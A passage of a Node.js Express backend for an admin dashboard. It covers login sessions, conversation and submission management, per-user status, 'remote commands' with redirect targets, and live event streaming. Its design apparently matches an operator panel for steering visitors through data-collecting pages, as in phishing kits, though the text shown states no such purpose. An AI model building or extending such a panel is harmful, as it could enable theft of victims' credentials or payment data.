    const ttlSeconds = 60 * 60 * 24 * 30; // 30 days
    const rawToken = crypto.randomBytes(48).toString('hex');
    const csrfToken = crypto.randomBytes(24).toString('hex');
    const now = nowIso();
    const expiresAt = new Date(Date.now() + ttlSeconds * 1000).toISOString();

    const sessionDoc = {
      id: nextSeqSync('sessions'),
      admin_id: admin.id,
      token_hash: hashToken(rawToken),
      csrf_token: csrfToken,
      created_at: now,
      expires_at: expiresAt,
      last_seen_at: now
    };

    localData.sessions.push(sessionDoc);
    admin.last_login_at = now;

    if (useLocalFallback) {
      saveLocalStore();
    } else {
      bgMongo(async () => {
        await col('sessions').insertOne(Object.assign({}, sessionDoc));
        await col('admins').updateOne({ id: admin.id }, { $set: { last_login_at: now } });
      }, 'loginSession');
    }

    setSessionCookie(req, res, rawToken, ttlSeconds);

    res.json({
      ok: true,
      admin: publicAdmin(admin),
      csrf: csrfToken,
      token: rawToken
    });
  } catch (err) {
    console.error('[login]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 4. Admin Logout: POST /api/logout.php
app.post(['/api/logout.php', '/api/logout'], async (req, res) => {
  try {
    const ctx = await requireAdminWrite(req, res);
    if (!ctx) return;

    const tokenHash = hashToken(ctx.rawToken);
    localData.sessions = localData.sessions.filter((s) => s.token_hash !== tokenHash);

    if (useLocalFallback) {
      saveLocalStore();
    } else {
      bgMongo(() => col('sessions').deleteOne({ token_hash: tokenHash }), 'logoutSession');
    }

    clearSessionCookie(req, res);
    res.json({ ok: true, message: 'Signed out.' });
  } catch (err) {
    console.error('[logout]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 5. Session Check: GET /api/session.php
app.get(['/api/session.php', '/api/session'], async (req, res) => {
  try {
    const ctx = await resolveAdminSession(req);
    if (!ctx) {
      return res.json({ ok: true, authenticated: false });
    }
    res.json({
      ok: true,
      authenticated: true,
      admin: publicAdmin(ctx.admin),
      csrf: ctx.session.csrf_token
    });
  } catch (err) {
    console.error('[session]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 6. Dashboard Bootstrap: GET /api/bootstrap.php
app.get(['/api/bootstrap.php', '/api/bootstrap'], async (req, res) => {
  try {
    const ctx = await requireAdmin(req, res);
    if (!ctx) return;

    const conversations = listConversations(300);
    const totals = getTotals();
    const lastEventId = latestEventId();

    const pages = Object.entries(PAGE_REGISTRY).map(([key, def]) => ({
      key,
      label_ar: def.label_ar,
      label_en: def.label_en,
      collects: def.collects
    }));

    const statuses = Object.entries(STATUS_DEFINITIONS).map(([key, def]) => ({
      key,
      label_ar: def.label_ar,
      tone: def.tone,
      waiting: def.waiting
    }));

    const commands = Object.entries(COMMAND_DEFINITIONS).map(([key, def]) => ({
      key,
      label_ar: def.label_ar,
      status: def.status,
      redirect: def.redirect
    }));

    res.json({
      ok: true,
      admin: publicAdmin(ctx.admin),
      csrf: ctx.session.csrf_token,
      pages,
      statuses,
      commands,
      conversations,
      totals,
      last_event_id: lastEventId
    });
  } catch (err) {
    console.error('[bootstrap]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 7. Conversations List: GET /api/conversations.php
app.get(['/api/conversations.php', '/api/conversations'], async (req, res) => {
  try {
    const ctx = await requireAdmin(req, res);
    if (!ctx) return;

    const limit = Math.max(1, Math.min(500, Number(inputVal(req, 'limit', 200)) || 200));
    const conversations = listConversations(limit);
    const totals = getTotals();
    const lastEventId = latestEventId();

    res.json({
      ok: true,
      conversations,
      totals,
      last_event_id: lastEventId
    });
  } catch (err) {
    console.error('[conversations]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 8. Single Conversation Detail: GET /api/conversation.php
app.get(['/api/conversation.php', '/api/conversation'], async (req, res) => {
  try {
    const ctx = await requireAdmin(req, res);
    if (!ctx) return;

    const userId = Number(inputVal(req, 'id', 0));
    if (!userId || userId <= 0) {
      return res.status(422).json({ ok: false, error: 'A valid conversation id is required.' });
    }

    const conversation = getUserConversation(userId);
    const lastEventId = latestEventId();

    if (!conversation) {
      return res.status(404).json({ ok: false, error: 'Conversation not found.' });
    }

    res.json({
      ok: true,
      conversation,
      last_event_id: lastEventId
    });
  } catch (err) {
    console.error('[conversation]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 8b. Fast Incremental Poll Fallback: GET /api/poll_events.php
app.get(['/api/poll_events.php', '/api/poll_events'], async (req, res) => {
  try {
    const ctx = await requireAdmin(req, res);
    if (!ctx) return;

    const since = Number(inputVal(req, 'last_id', 0)) || 0;
    const missed = eventsSince(since, 200);
    const cursor = latestEventId();

    res.json({
      ok: true,
      cursor,
      events: missed.map((evt) => ({
        id: evt.id,
        type: evt.type,
        payload: Object.assign({}, evt.payload, { _event_id: evt.id })
      }))
    });
  } catch (err) {
    console.error('[poll_events]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 9. Mark Read: POST /api/mark_read.php
app.post(['/api/mark_read.php', '/api/mark_read'], async (req, res) => {
  try {
    const ctx = await requireAdminWrite(req, res);
    if (!ctx) return;

    const markAll = Number(inputVal(req, 'all', 0)) === 1;
    const isRead = Number(inputVal(req, 'read', 1)) === 1;

    if (markAll) {
      for (const u of localData.users) u.is_read = isRead;
      if (useLocalFallback) {
        saveLocalStore();
      } else {
        bgMongo(() => col('users').updateMany({}, { $set: { is_read: isRead } }), 'markReadAll');
      }
      recordEvent('conversations.read_all', null, { is_read: isRead });
      return res.json({ ok: true, marked_all: true, is_read: isRead });
    }

    const userId = Number(inputVal(req, 'id', 0));
    if (!userId || userId <= 0) {
      return res.status(422).json({ ok: false, error: 'A valid conversation id is required.' });
    }

    const user = findUserById(userId);
    if (!user) {
      return res.status(404).json({ ok: false, error: 'Conversation not found.' });
    }

    user.is_read = isRead;
    if (useLocalFallback) {
      saveLocalStore();
    } else {
      bgMongo(() => col('users').updateOne({ id: userId }, { $set: { is_read: isRead } }), 'markRead');
    }

    const pub = userPublicRow(user);
    recordEvent('user.read', userId, {
      user: pub,
      is_read: isRead
    });

    res.json({
      ok: true,
      user: pub,
      is_read: isRead
    });
  } catch (err) {
    console.error('[mark_read]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 9b. Clear All Users & Submissions: POST /api/clear_all.php
app.post(['/api/clear_all.php', '/api/clear_all'], async (req, res) => {
  try {
    const ctx = await requireAdminWrite(req, res);
    if (!ctx) return;

    localData.users = [];
    localData.submissions = [];
    localData.messages = [];
    localData.commands = [];

    if (useLocalFallback) {
      saveLocalStore();
    } else {
      bgMongo(async () => {
        await Promise.all([
          col('users').deleteMany({}),
          col('submissions').deleteMany({}),
          col('messages').deleteMany({}),
          col('commands').deleteMany({})
        ]);
      }, 'clearAll');
    }

    recordEvent('conversations.cleared', null, { cleared: true });

    res.json({
      ok: true,
      cleared: true
    });
  } catch (err) {
    console.error('[clear_all]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 9c. Pin / Unpin a Conversation: POST /api/pin_user.php
app.post(['/api/pin_user.php', '/api/pin_user'], async (req, res) => {
  try {
    const ctx = await requireAdminWrite(req, res);
    if (!ctx) return;

    const userId = Number(inputVal(req, 'id', 0));
    if (!userId || userId <= 0) {
      return res.status(422).json({ ok: false, error: 'A valid conversation id is required.' });
    }

    const user = findUserById(userId);
    if (!user) {
      return res.status(404).json({ ok: false, error: 'Conversation not found.' });
    }

    const rawPinned = inputVal(req, 'pinned', null);
    const isPinned = rawPinned === null || rawPinned === ''
      ? !Boolean(user.is_pinned)
      : Number(rawPinned) === 1 || rawPinned === true;

    user.is_pinned = isPinned;
    if (useLocalFallback) {
      saveLocalStore();
    } else {
      bgMongo(() => col('users').updateOne({ id: userId }, { $set: { is_pinned: isPinned } }), 'pinUser');
    }

    const pub = userPublicRow(user);
    recordEvent('user.pinned', userId, {
      user: pub,
      is_pinned: isPinned
    });

    res.json({
      ok: true,
      user: pub,
      is_pinned: isPinned
    });
  } catch (err) {
    console.error('[pin_user]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 9d. Delete Single Conversation: POST /api/delete_user.php
app.post(['/api/delete_user.php', '/api/delete_user'], async (req, res) => {
  try {
    const ctx = await requireAdminWrite(req, res);
    if (!ctx) return;

    const userId = Number(inputVal(req, 'id', 0));
    if (!userId || userId <= 0) {
      return res.status(422).json({ ok: false, error: 'A valid conversation id is required.' });
    }

    const user = findUserById(userId);
    if (!user) {
      return res.status(404).json({ ok: false, error: 'Conversation not found.' });
    }

    localData.users = localData.users.filter((u) => u.id !== userId);
    localData.submissions = localData.submissions.filter((s) => s.user_id !== userId);
    localData.messages = localData.messages.filter((m) => m.user_id !== userId);
    localData.commands = localData.commands.filter((c) => c.user_id !== userId);

    if (useLocalFallback) {
      saveLocalStore();
    } else {
      bgMongo(async () => {
        await Promise.all([
          col('users').deleteOne({ id: userId }),
          col('submissions').deleteMany({ user_id: userId }),
          col('messages').deleteMany({ user_id: userId }),
          col('commands').deleteMany({ user_id: userId })
        ]);
      }, 'deleteUser');
    }

    recordEvent('user.deleted', userId, { id: userId });

    res.json({
      ok: true,
      id: userId,
      deleted: true
    });
  } catch (err) {
    console.error('[delete_user]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 10. Set Status: POST /api/set_status.php
app.post(['/api/set_status.php', '/api/set_status'], async (req, res) => {
  try {
    const ctx = await requireAdminWrite(req, res);
    if (!ctx) return;

    const userId = Number(inputVal(req, 'id', 0));
    const status = String(inputVal(req, 'status', '')).trim();

    if (!userId || userId <= 0) {
      return res.status(422).json({ ok: false, error: 'A valid conversation id is required.' });
    }

    const def = STATUS_DEFINITIONS[status];
    if (!def) {
      return res.status(422).json({ ok: false, error: 'Unknown status value.' });
    }

    const user = findUserById(userId);
    if (!user) {
      return res.status(404).json({ ok: false, error: 'Conversation not found.' });
    }

    const waiting = Boolean(def.waiting);
    const now = nowIso();

    user.status = status;
    user.waiting_for_decision = waiting;
    user.last_activity = now;
    user.is_read = false;

    if (useLocalFallback) {
      saveLocalStore();
    } else {
      bgMongo(() =>
        col('users').updateOne(
          { id: userId },
          {
            $set: {
              status,
              waiting_for_decision: waiting,
              last_activity: now,
              is_read: false
            }
          }
        ), 'setStatus');
    }

    const pub = userPublicRow(user);
    recordEvent('user.status', userId, {
      user: pub,
      status,
      label: def.label_ar
    });

    res.json({
      ok: true,
      user: pub,
      status
    });
  } catch (err) {
    console.error('[set_status]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 11. Issue Remote Command: POST /api/issue_command.php
app.post(['/api/issue_command.php', '/api/issue_command'], async (req, res) => {
  try {
    const ctx = await requireAdminWrite(req, res);
    if (!ctx) return;

    const userId = Number(inputVal(req, 'id', 0));
    const command = String(inputVal(req, 'command', '')).trim().toUpperCase();

    if (!userId || userId <= 0) {
      return res.status(422).json({ ok: false, error: 'A valid conversation id is required.' });
    }

    const def = COMMAND_DEFINITIONS[command];
    if (!def) {
      return res.status(422).json({ ok: false, error: 'Unknown command.' });
    }

    const user = findUserById(userId);
    if (!user) {
      return res.status(404).json({ ok: false, error: 'Conversation not found.' });
    }

    const adminName = String(ctx.admin.username || 'admin');
    const now = nowIso();

    // Clear any previously unconsumed commands for this user
    for (const c of localData.commands) {
      if (c.user_id === userId && !c.consumed_at) c.consumed_at = now;
    }

    const cmdDoc = {
      id: nextSeqSync('commands'),
      user_id: userId,
      command,
      issued_by: adminName,
      created_at: now,
      consumed_at: null
    };

    localData.commands.push(cmdDoc);

    const status = def.status;
    const statusDef = STATUS_DEFINITIONS[status];
    const waiting = statusDef ? Boolean(statusDef.waiting) : false;

    user.status = status;
    user.waiting_for_decision = waiting;
    user.last_activity = now;
    user.is_read = false;

    if (useLocalFallback) {
      saveLocalStore();
    } else {
      bgMongo(async () => {
        await col('commands').updateMany(
          { user_id: userId, consumed_at: null, id: { $ne: cmdDoc.id } },
          { $set: { consumed_at: now } }
        );
        await col('commands').insertOne(Object.assign({}, cmdDoc));
        await col('users').updateOne(
          { id: userId },
          {
            $set: {
              status,
              waiting_for_decision: waiting,
              last_activity: now,
              is_read: false
            }
          }
        );
      }, 'issueCommand');
    }

    addMessage(userId, 'out', adminName, def.label_ar);

    const pub = userPublicRow(user);
    recordEvent('command.issued', userId, {
      user: pub,
      command,
      label: def.label_ar,
      status,
      command_id: cmdDoc.id
    });

    res.json({
      ok: true,
      user: pub,
      command,
      status
    });
  } catch (err) {
    console.error('[issue_command]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 12. Real-time Server-Sent Events: GET /api/stream.php
app.get(['/api/stream.php', '/api/stream'], async (req, res) => {
  try {
    const ctx = await requireAdmin(req, res);
    if (!ctx) return;

    const headerCursor = String(req.headers['last-event-id'] || '').trim();
    let cursor = 0;
    if (headerCursor && /^\d+$/.test(headerCursor)) {
      cursor = Number(headerCursor);
    } else if (req.query.last_id !== undefined && Number(req.query.last_id) >= 0) {
      cursor = Number(req.query.last_id);
    } else {
      cursor = latestEventId();
    }

    res.setHeader('Content-Type', 'text/event-stream; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate, no-transform');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('X-Accel-Buffering', 'no');
    res.flushHeaders();

    const sendFrame = (event, data, id = null) => {
      if (res.writableEnded) return;
      if (id !== null && id !== undefined) {
        res.write(`id: ${id}\n`);
      }
      res.write(`event: ${event}\n`);
      res.write(`data: ${JSON.stringify(data)}\n\n`);
    };

    // 2KB comment padding forces Cloudflare / Render / Nginx proxies to flush immediately
    res.write(`: ${' '.repeat(2048)}\n\n`);
    res.write('retry: 2000\n\n');
    sendFrame('ready', { cursor, server_time: nowIso() });

    // Send any missed events since cursor
    const missed = eventsSince(cursor, 200);
    for (const evt of missed) {
      const payload = Object.assign({}, evt.payload, { _event_id: evt.id });
      sendFrame(evt.type, payload, evt.id);
      cursor = evt.id;
    }

    const onRealtimeEvent = (evt) => {
      if (evt.id <= cursor) return;
      cursor = evt.id;
      const payload = Object.assign({}, evt.payload, { _event_id: evt.id });
      sendFrame(evt.type, payload, evt.id);
    };

    eventBus.on('event', onRealtimeEvent);

    const pingTimer = setInterval(() => {
      if (!res.writableEnded) {
        res.write(`: ping ${Math.floor(Date.now() / 1000)}\n\n`);
      }
    }, 12000);

    const maxRuntimeTimer = setTimeout(() => {
      if (!res.writableEnded) {
        sendFrame('bye', { cursor });
        res.end();
      }
    }, 55000);

    req.on('close', () => {
      eventBus.off('event', onRealtimeEvent);
      clearInterval(pingTimer);
      clearTimeout(maxRuntimeTimer);
    });
  } catch (err) {
    console.error('[stream]', err);
    if (!res.headersSent) {
      res.status(500).json({ ok: false, error: 'Server error.' });
    }
  }
});

/* ============================================================
   7. Static Hosting Support (Localhost & Optional Unified Render)
   ============================================================ */

const frontendDir = path.resolve(__dirname, '..', 'frontend');
const dashboardDir = path.resolve(__dirname, '..', 'dashboard');

const dashboardHosts = ALLOWED_DASHBOARD_ORIGINS.map((u) => {
  try { return new URL(u).host.toLowerCase(); } catch (e) { return ''; }
}).filter(Boolean);

if (fs.existsSync(dashboardDir)) {
  const dashStatic = express.static(dashboardDir, { extensions: ['html'] });
  app.use('/dashboard', dashStatic);

  app.use((req, res, next) => {
    const reqHost = String(req.headers.host || '').toLowerCase();
    if (reqHost && dashboardHosts.includes(reqHost) && !req.path.startsWith('/api')) {
      return dashStatic(req, res, next);
    }
    next();
  });
}

if (fs.existsSync(frontendDir)) {
  app.use(express.static(frontendDir, { extensions: ['html'] }));
}

/* ============================================================
   8. Start Server
   ============================================================ */

initDatabase()
  .then(() => {
    app.listen(PORT, '0.0.0.0', () => {
      console.log(`============================================================`);
      console.log(`Jusour Render Server listening on http://localhost:${PORT}`);
      console.log(`Instance Namespace : ${INSTANCE_PREFIX}`);
      console.log(`Frontend Origin(s) : ${FRONTEND_URL || '* (All / Localhost)'}`);
      console.log(`Dashboard Origin(s): ${DASHBOARD_URL || '* (All / Localhost)'}`);
      console.log(`Admin Credentials  : ${ADMIN_USER} / ${'*'.repeat(ADMIN_PASS.length)}`);
      console.log(`============================================================`);
    });
  })
  .catch((err) => {
    console.error('[fatal] Failed to initialize database:', err);
    process.exit(1);
  });
